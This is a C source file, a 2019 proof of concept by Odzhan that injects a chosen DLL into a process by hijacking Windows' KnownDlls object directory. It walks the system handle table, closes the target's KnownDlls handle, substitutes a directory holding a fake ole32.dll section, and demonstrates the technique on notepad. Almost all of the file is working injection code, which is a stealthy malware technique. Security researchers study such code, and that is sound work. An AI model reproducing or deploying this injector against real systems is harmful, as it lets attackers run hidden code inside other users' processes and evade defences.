/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

HRESULT GetDesktopShellView(REFIID riid, void **ppv) {
    HWND           hwnd;
    IDispatch      *pdisp;
    IShellWindows  *psw;
    VARIANT        vEmpty = {};
    IShellBrowser  *psb;
    IShellView     *psv;
    HRESULT        hr;
    
    *ppv = NULL;
        
    hr = CoCreateInstance(CLSID_ShellWindows, 
      NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));
      
    if(hr == S_OK) {
      hr = psw->FindWindowSW(
        &vEmpty, &vEmpty, 
        SWC_DESKTOP, (long*)&hwnd, 
        SWFO_NEEDDISPATCH, &pdisp);
        
      if(hr == S_OK) {
        hr = IUnknown_QueryService(
          pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
        if(hr == S_OK) {
          hr = psb->QueryActiveShellView(&psv);
          if(hr == S_OK) {
            hr = psv->QueryInterface(riid, ppv);
            psv->Release();
          }
          psb->Release();
        }
        pdisp->Release();
      }
      psw->Release();
    }
    return hr;
}

HRESULT GetShellDispatch(
  IShellView *psv, REFIID riid, void **ppv) 
{
    IShellFolderViewDual *psfvd;
    IDispatch            *pdispBackground, *pdisp;;
    HRESULT              hr;
    
    *ppv = NULL;
    hr = psv->GetItemObject(
      SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));
    
    if(hr == S_OK) {
      hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
      if(hr == S_OK) {
        hr = psfvd->get_Application(&pdisp);
        if(hr == S_OK) {
          hr = pdisp->QueryInterface(riid, ppv);
          pdisp->Release();
        }
        psfvd->Release();
      }
      pdispBackground->Release();
    }
    return hr;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) {
    IShellView      *psv;
    IShellDispatch2 *psd;
    HRESULT         hr;
    BSTR            bstrFile;
    VARIANT         vtHide, vtEmpty = {};
    
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    
    bstrFile = SysAllocString(pszFile);
    if(bstrFile == NULL) return E_OUTOFMEMORY;
    
    hr = GetDesktopShellView(IID_PPV_ARGS(&psv));
    if(hr == S_OK) {
      hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
      if(hr == S_OK) {
        V_VT(&vtHide)  = VT_INT;
        V_INT(&vtHide) = SW_HIDE;
        hr = psd->ShellExecuteW(
          bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
        psd->Release();
      }
      psv->Release();
    }
    SysFreeString(bstrFile);
    return hr;
}

HANDLE GetKnownDllHandle2(DWORD pid, HANDLE hp) {
    ULONG                      len;
    NTSTATUS                   nts;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     obj, h = NULL;
    PSYSTEM_HANDLE_INFORMATION hl;
    BYTE                       buf[1024];
    POBJECT_NAME_INFORMATION   name = (POBJECT_NAME_INFORMATION)buf;
    
    // read the full list of system handles
    for(len = 8192; ;len += 8192) {
      list = malloc(len);
      
      nts = NtQuerySystemInformation(
          SystemHandleInformation, list, len, NULL);
      
      // break from loop if ok    
      if(NT_SUCCESS(nts)) break;
      
      // free list and continue
      free(list);
    }
    
    hl = (PSYSTEM_HANDLE_INFORMATION)list;

    // for each handle
    for(i=0; i<hl->NumberOfHandles && h == NULL; i++) {
      // skip these to avoid hanging process
      if((hl->Handles[i].GrantedAccess == 0x0012019f) || 
         (hl->Handles[i].GrantedAccess == 0x001a019f) || 
         (hl->Handles[i].GrantedAccess == 0x00120189) || 
         (hl->Handles[i].GrantedAccess == 0x00100000)) {
        continue;
      }

      // skip if this handle not in our target process
      if(hl->Handles[i].UniqueProcessId != pid) {
        continue;
      }
      
      // duplicate the handle object
      nts = NtDuplicateObject(
            hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &obj, 0, FALSE, 
            DUPLICATE_SAME_ACCESS);
        
      if(NT_SUCCESS(nts)) {
        // query the name
        NtQueryObject(
          obj, ObjectNameInformation, 
          name, MAX_PATH, NULL);
          
        // if name returned.. 
        if(name->Name.Length != 0) {
          // is it knowndlls directory?
          if(!lstrcmp(name->Name.Buffer, L"\\KnownDlls")) {
            h = (HANDLE)hl->Handles[i].HandleValue;
          }
        }
        NtClose(obj);
      }
    }
    free(list);
    return h;
}

LPVOID GetKnownDllHandle(DWORD pid) {
    LPVOID                   m, va = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    BYTE                     buf[1024];
    POBJECT_NAME_INFORMATION n = (POBJECT_NAME_INFORMATION)buf;

    // get base of NTDLL and pointer to section header
    m   = GetModuleHandle(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt; i++) {
      if((LPVOID)ds[i] == NULL) continue;
      // query the object name
      NtQueryObject((LPVOID)ds[i], 
        ObjectNameInformation, n, MAX_PATH, NULL);
            
      // string returned?
      if(n->Name.Length != 0) {
        // does it match ours?
        if(!lstrcmp(n->Name.Buffer, L"\\KnownDlls")) {
          // return virtual address
          va = &ds[i];
          break;
        }
      }
    }
    return va;
}

VOID knowndll_inject(DWORD pid, PWCHAR fake_dll, PWCHAR target_dll) {
    NTSTATUS          nts;
    DWORD             i;
    HANDLE            hp, hs, hf, dir, target_handle;
    OBJECT_ATTRIBUTES fa, da, sa;
    UNICODE_STRING    fn, dn, sn, ntpath;
    IO_STATUS_BLOCK   iosb;

    // open process for duplicating handle, suspending/resuming process
    hp = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, FALSE, pid);
    
    // 1. Get the KnownDlls directory object handle from remote process
    target_handle = GetKnownDllHandle2(pid, hp);

    // 2. Create empty object directory, insert named section of DLL to hijack
    //    using file handle of DLL to inject    
    InitializeObjectAttributes(&da, NULL, 0, NULL, NULL);
    nts = NtCreateDirectoryObject(&dir, DIRECTORY_ALL_ACCESS, &da);
    
    // 2.1 open the fake DLL
    RtlDosPathNameToNtPathName_U(fake_dll, &fn, NULL, NULL);
    InitializeObjectAttributes(&fa, &fn, OBJ_CASE_INSENSITIVE, NULL, NULL);
      
    nts = NtOpenFile(
      &hf, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE,
      &fa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    
    // 2.2 create named section of target DLL using fake DLL image
    RtlInitUnicodeString(&sn, target_dll);
    InitializeObjectAttributes(&sa, &sn, OBJ_CASE_INSENSITIVE, dir, NULL);
        
    nts = NtCreateSection(
      &hs, SECTION_ALL_ACCESS, &sa, 
      NULL, PAGE_EXECUTE, SEC_IMAGE, hf);
            
    // 3. Close the known DLLs handle in remote process
    NtSuspendProcess(hp);
    
    DuplicateHandle(hp, target_handle, 
      GetCurrentProcess(), NULL, 0, TRUE, DUPLICATE_CLOSE_SOURCE);
                    
    // 4. Duplicate object directory for remote process
    DuplicateHandle(
        GetCurrentProcess(), dir, hp, 
        NULL, 0, TRUE, DUPLICATE_SAME_ACCESS);
        
    NtResumeProcess(hp);
    CloseHandle(hp);
    
    printf("Select File->Open to load \"%ws\" into notepad.\n", fake_dll);
    printf("Press any key to continue...\n");
    getchar();
}

// list KnownDLLs
VOID knowndll_list(VOID) {
    HKEY  hk;
    DWORD err, namelen, sublen, idx;
    WCHAR name[MAX_PATH], subkey[MAX_PATH];
    
    err = RegOpenKeyEx(
      HKEY_LOCAL_MACHINE, 
      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs", 
      0, KEY_READ | KEY_QUERY_VALUE, &hk);
      
    if(err == ERROR_SUCCESS) {
      for(idx=0; ;idx++) {
        sublen  = MAX_PATH;
        namelen = MAX_PATH;
        
        err = RegEnumValue(
          hk, idx, subkey, &sublen, 
          NULL, NULL, (PBYTE)name, &namelen);
          
        if(err != ERROR_SUCCESS) break;
        printf("%ws\n", name);
      }
      RegCloseKey(hk);
    }
}

int main(void) {
    int                 argc;
    WCHAR               **argv;
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               cmd[] = L"notepad";
    WCHAR               path[MAX_PATH];
    UNICODE_STRING      ntpath;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      printf("usage: knowndll_inject <dll_to_inject>\n");
      return 0;
    }
    
    // create notepad
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_SHOWDEFAULT;
    
    printf("Running notepad.\n");
    if(!CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
      printf("Unable to create host process.\n");
      return 0;
    }
    
    printf("Created notepad.exe with pid : %i\n", pi.dwProcessId);
    
    GetFullPathName(argv[1], MAX_PATH, path, NULL);
    knowndll_inject(pi.dwProcessId, path, L"ole32.dll");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    TerminateProcess(pi.hProcess, 0);
    
    return 0;
}
